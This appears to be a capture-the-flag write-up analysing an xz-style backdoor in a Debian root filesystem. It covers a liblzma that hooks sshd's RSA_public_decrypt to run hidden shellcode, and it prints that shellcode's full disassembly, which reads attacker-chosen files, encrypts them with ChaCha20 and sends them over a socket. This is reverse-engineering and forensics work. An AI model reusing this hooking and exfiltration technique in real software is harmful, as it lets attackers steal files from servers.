# 5: Sshd

In this challenge, you are given a big tarfile of a root fileystem that has apparently been backdoored. This is essentially a forenshits challenge. This is also themed after the famous [libxz backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) from this year, if you have [background knowledge](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) about that, it makes this challenge much easier. 

The usual CTF tech here is you sort all the files by modified time because the challenge author is going to start from a base image, then change some shit to implement the challenge. So you only care about the recently modified stuff

So basically, [list all the files and sort them by time](./sorted.txt)

Unfortunately, the author did a bunch of apt upgrade shit which creates a bunch of noise in the modified time, but here we can see:

```
(Least recently modified)
... a ton of uninteresting changes at 18:18
drwxr-xr-x toomanybananas/primarygroup        0 2024-07-31 18:18 ./var/lib/pam/
-rwxr-xr-x toomanybananas/primarygroup  1261336 2024-08-02 18:29 ./usr/sbin/sshd <-- 👀
-rw-r--r-- toomanybananas/primarygroup        0 2024-08-03 15:21 ./root/anonymized.phony
-rw-r--r-- toomanybananas/primarygroup        8 2024-08-15 05:10 ./usr/lib/x86_64-linux-gnu/libanl.a
... a ton of uninteresting changes at 05:10
... uninteresting root cert shit b/c they updated ca-certificates
-rw------- toomanybananas/primarygroup  2084864 2024-09-09 17:34 ./var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676 <-- 👀
-rw-r--r-- toomanybananas/primarygroup   203816 2024-09-09 17:34 ./usr/lib/x86_64-linux-gnu/liblzma.so.5.4.1 <-- 👀
drwxr-xr-x toomanybananas/primarygroup        0 2024-09-09 17:43 ./var/lib/systemd/coredump/
drwxr-xr-x toomanybananas/primarygroup 0 2024-09-09 17:48 ./
-rw-r--r-- toomanybananas/primarygroup     2304 2024-09-11 16:55 ./root/flag.txt <-- fake flag 😒
drwx------ toomanybananas/primarygroup        0 2024-09-11 16:55 ./root/
(Most recently modified)
```

So essentially, we are interested in the following files:

- sshd
- liblzma.so.5.4.1
- sshd.core.93794.0.0.11.1725917676

Since these some binaries are changed, we want a base to diff them against.

From /etc/debian_version and /etc/os-release we know it's debian 12.6 (bookworm) and we can also see from the apt package manager files on disk (`status`) we can tell the exact version of sshd is openssh 1:9.2p1-2+deb12u3 and the liblzma is liblzma5_5.4.1-0.2_amd64.

We can grab these from the debian package repo and extract them with 7zip to get a clean copy.

For sshd, the changes are not interesting. The patching is also just some simple byte patches. The functions `ssh_sandbox_child` and `platform_disable_tracing` are patched out to do nothing. This is not very interesting, these basically make it so sshd no longer seccomp's itself and so it's dumpable. The latter obviously is so a corefile can be produced (for the purposes of making this challenge possible), the former so ... I guess the sshd can do "bad shit"? But this isn't actually any implementation of "bad shit", that needs to be somewhere else.

Also, if we check the corefile vmmap, we see something interesting:

![image](https://github.com/user-attachments/assets/7e64f324-0075-428e-a141-177e756e9994)

So now, we look toward liblzma.

## Liblzma backdoor

If we look at the new liblzma and the original, then use [Diaphora](http://diaphora.re/) to do some bindiffing, we can see some interesting changes.

Notably, we see a new function in the initialization function list (note, there are no symbols provided so I did the renaming):

![image](https://github.com/user-attachments/assets/a4d3e11f-5a18-4d09-b058-fd6051d0ea82)

If we follow this func it does this (func starts at 0x4DD0):

![image](https://github.com/user-attachments/assets/d7c4d5f8-e9f4-4540-9112-a7ec3c0a15d4)

(it uses an open source library called [plthook](https://github.com/kubo/plthook) to do some dirty work here, it's just statically linked in. Not very covert! lol)

So this basically hooks `RSA_public_decrypt` in opensshd to do some bad shit, it makes it go to here instead:

![image](https://github.com/user-attachments/assets/6dc6cb15-aa1d-4e30-9e13-63b18f2df9ca)

Here if the public key is some special key, it decrypts some code, mmaps to it, and jumps to it.

So let's grab that [shellcode](./plain.bin) from the corefile and look at it.

The code basically is doing this, comments added

```asm
seg000:0000000000000DC2     ; __int64 __fastcall cringemain()
seg000:0000000000000DC2     cringemain      proc near               ; CODE XREF: start+4↑p
seg000:0000000000000DC2
seg000:0000000000000DC2     key             = byte ptr -1278h
seg000:0000000000000DC2     nonce           = byte ptr -1258h
seg000:0000000000000DC2     exfil_filename  = byte ptr -1248h
seg000:0000000000000DC2     contents        = byte ptr -1148h
seg000:0000000000000DC2     exfil_namesize  = dword ptr -0C8h
seg000:0000000000000DC2     mysize          = dword ptr -0C4h
seg000:0000000000000DC2     cipher          = chacha_state ptr -0C0h
seg000:0000000000000DC2
seg000:0000000000000DC2 000                 push    rbx
seg000:0000000000000DC3 008                 push    rsi
seg000:0000000000000DC4 010                 push    rdi
seg000:0000000000000DC5 018                 push    r12
seg000:0000000000000DC7 020                 push    rbp
seg000:0000000000000DC8 028                 mov     rbp, rsp
seg000:0000000000000DCB 028                 lea     rsp, [rsp-1688h]
seg000:0000000000000DD3 16B0                mov     eax, 0A00020Fh
seg000:0000000000000DD8 16B0                mov     dx, 539h
seg000:0000000000000DDC 16B0                call    opensocket
seg000:0000000000000DE1 16B0                mov     ebx, eax
seg000:0000000000000DE3 16B0                lea     rsi, [rbp+key]  ; key
seg000:0000000000000DEA 16B0                push    2Dh ; '-'
seg000:0000000000000DEC 16B8                pop     rax             ; recvfrom
seg000:0000000000000DED 16B0                mov     edi, ebx
seg000:0000000000000DEF 16B0                push    20h ; ' '
seg000:0000000000000DF1 16B8                pop     rdx
seg000:0000000000000DF2 16B0                xor     r10d, r10d
seg000:0000000000000DF5 16B0                xor     r8d, r8d
seg000:0000000000000DF8 16B0                xor     r9d, r9d
seg000:0000000000000DFB 16B0                syscall                 ; Low latency system call
seg000:0000000000000DFD 16B0                lea     rsi, [rbp+nonce] ; nonce
seg000:0000000000000E04 16B0                push    2Dh ; '-'       ; recvfrom
seg000:0000000000000E06 16B8                pop     rax
seg000:0000000000000E07 16B0                mov     edi, ebx
seg000:0000000000000E09 16B0                push    0Ch
seg000:0000000000000E0B 16B8                pop     rdx
seg000:0000000000000E0C 16B0                xor     r10d, r10d
seg000:0000000000000E0F 16B0                xor     r8d, r8d
seg000:0000000000000E12 16B0                xor     r9d, r9d
seg000:0000000000000E15 16B0                syscall                 ; Low latency system call
seg000:0000000000000E17 16B0                lea     rsi, [rbp+exfil_namesize] ; len of the filename
seg000:0000000000000E1E     recvfrom
seg000:0000000000000E1E 16B0                push    2Dh ; '-'
seg000:0000000000000E20 16B8                pop     rax
seg000:0000000000000E21 16B0                mov     edi, ebx
seg000:0000000000000E23 16B0                push    4
seg000:0000000000000E25 16B8                pop     rdx
seg000:0000000000000E26 16B0                xor     r10d, r10d
seg000:0000000000000E29 16B0                xor     r8d, r8d
seg000:0000000000000E2C 16B0                xor     r9d, r9d
seg000:0000000000000E2F 16B0                syscall                 ; Low latency system call
seg000:0000000000000E31 16B0                lea     rsi, [rbp+exfil_filename] ; filename
seg000:0000000000000E38 16B0                push    2Dh ; '-'
seg000:0000000000000E3A 16B8                pop     rax
seg000:0000000000000E3B 16B0                mov     edi, ebx
seg000:0000000000000E3D 16B0                mov     edx, [rbp+exfil_namesize]
seg000:0000000000000E43 16B0                xor     r10d, r10d
seg000:0000000000000E46 16B0                xor     r8d, r8d
seg000:0000000000000E49 16B0                xor     r9d, r9d
seg000:0000000000000E4C 16B0                syscall                 ; Low latency system call
seg000:0000000000000E4E 16B0                movsxd  rax, eax
seg000:0000000000000E51 16B0                mov     [rbp+rax+exfil_filename], 0
seg000:0000000000000E59 16B0                lea     rdi, [rbp+exfil_filename] ; filename
seg000:0000000000000E60 16B0                push    2
seg000:0000000000000E62 16B8                pop     rax             ; open
seg000:0000000000000E63 16B0                xor     esi, esi
seg000:0000000000000E65 16B0                xor     edx, edx
seg000:0000000000000E67 16B0                syscall                 ; Low latency system call
seg000:0000000000000E69 16B0                mov     r12d, eax
seg000:0000000000000E6C 16B0                lea     rsi, [rbp+contents] ; working buf for the shit to exfil
seg000:0000000000000E73 16B0                xor     eax, eax        ; read
seg000:0000000000000E75 16B0                mov     edi, r12d
seg000:0000000000000E78 16B0                mov     edx, 80h
seg000:0000000000000E7D 16B0                syscall                 ; Low latency system call
seg000:0000000000000E7F 16B0                lea     rdi, [rbp+contents] ; strlen it
seg000:0000000000000E86 16B0                xor     al, al
seg000:0000000000000E88 16B0                xor     ecx, ecx
seg000:0000000000000E8A 16B0                dec     rcx
seg000:0000000000000E8D 16B0                repne scasb
seg000:0000000000000E8F 16B0                not     ecx
seg000:0000000000000E91 16B0                dec     ecx
seg000:0000000000000E93 16B0                mov     [rbp+mysize], ecx
seg000:0000000000000E99 16B0                lea     rax, [rbp+cipher] ; cipher
seg000:0000000000000EA0 16B0                lea     rdx, [rbp+key]  ; key
seg000:0000000000000EA7 16B0                lea     rcx, [rbp+nonce] ; nonce
seg000:0000000000000EAE 16B0                xor     r8d, r8d        ; ctr
seg000:0000000000000EB1 16B0                call    dochachashit    ; cipherment shit
seg000:0000000000000EB6 16B0                lea     rax, [rbp+cipher] ; a1
seg000:0000000000000EBD 16B0                lea     rdx, [rbp+contents] ; a3
seg000:0000000000000EC4 16B0                mov     ecx, [rbp+mysize] ; a2
seg000:0000000000000ECA 16B0                call    chacha          ; cipherment shit 2
seg000:0000000000000ECF 16B0                lea     rsi, [rbp+mysize]
seg000:0000000000000ED6 16B0                push    2Ch ; ','       ; sendto
seg000:0000000000000ED8 16B8                pop     rax
seg000:0000000000000ED9 16B0                mov     edi, ebx
seg000:0000000000000EDB 16B0                push    4
seg000:0000000000000EDD 16B8                pop     rdx
seg000:0000000000000EDE 16B0                xor     r10d, r10d
seg000:0000000000000EE1 16B0                xor     r8d, r8d
seg000:0000000000000EE4 16B0                xor     r9d, r9d
seg000:0000000000000EE7 16B0                syscall                 ; Low latency system call
seg000:0000000000000EE9 16B0                lea     rsi, [rbp+contents]
seg000:0000000000000EF0 16B0                push    2Ch ; ','       ; sendto
seg000:0000000000000EF2 16B8                pop     rax
seg000:0000000000000EF3 16B0                mov     edi, ebx
seg000:0000000000000EF5 16B0                mov     edx, [rbp+mysize]
seg000:0000000000000EFB 16B0                xor     r10d, r10d
seg000:0000000000000EFE 16B0                xor     r8d, r8d
seg000:0000000000000F01 16B0                xor     r9d, r9d
seg000:0000000000000F04 16B0                syscall                 ; Low latency system call
seg000:0000000000000F06 16B0                mov     eax, r12d
seg000:0000000000000F09 16B0                call    close
seg000:0000000000000F0E 16B0                mov     eax, ebx
seg000:0000000000000F10 16B0                xor     edx, edx
seg000:0000000000000F12 16B0                call    sock_shutdown
seg000:0000000000000F17 16B0                xor     eax, eax
seg000:0000000000000F19 16B0                leave
seg000:0000000000000F1A 020                 pop     r12
seg000:0000000000000F1C 018                 pop     rdi
seg000:0000000000000F1D 010                 pop     rsi
seg000:0000000000000F1E 008                 pop     rbx
seg000:0000000000000F1F 000                 retn
seg000:0000000000000F1F     cringemain      endp
```

So this is basically a backdoor that:
- opens a socket
- reads 32 bytes (a chacha20 key) from the socket
- reads 12 bytes (chacha20 nonce) from the socket
- reads 4 bytes = an integer N (length of the filename to read)
- reads N bytes from the socket
- opens the file
- reads the file
- strlen's the file contents
- chacha20 encrypt the file
- send the file to the socket

If we were doing this fully statically, the challenge would not be solvable. But luckily we have a corefile.

We are lucky the corefile was produced right after this shit was sent, so all the data we need is still just chilling on the stack. This is why it's hard to do crypto right; here the best practice would be to zero key material from memory after use, but they didn't do that.

Since chacha20 is a stream cipher, one interesting observation here is that decryption and encryption are the same operation: given the same key and nonce, they use the same keystream which is simply XORed with the input.

So all we need to do is fine the chacha20 key and nonce from the memory, as well as the encrypted flag sent, and we can just re-run this shellcode but with the ciphertext as the contents of the flag file it's reading.

Note that if you actually try to use normal chacha20 from say, Pycryptodome, it won't work because they fucked up the chacha20 implementation in some slight way that I wasn't interested in fully reversing.

I reversed the stack offsets to be 100% sure that I was getting the right data, since I wasn't trying to solve as quickly as possible. But realistically you can guess what the shit is on the stack just by staring at it and making some educated guesses, if you don't want to reverse it. Here it is:

![image](https://github.com/user-attachments/assets/1125bf94-9f8a-44e7-9183-d84e06d54efb)

So to run this shellcode to do the decryption, I asked Chatgpt to create a quick [read-mmap-copy-call harness](./lol.c) and then just put this under gdb.

Then, I breakpointed the start of the shellcode, and stepped through it manually. Each time it would do a syscall, I would just manually update the memory or registers in gdb to simulate the syscall reading the parameters (key, nonce, flag contents, etc.) from socket or disk.

Then you step past the chacha20 call, and voila you have your flag:

![image](https://github.com/user-attachments/assets/c5ce8f12-b50b-4af5-8452-ab77b8095d3c)

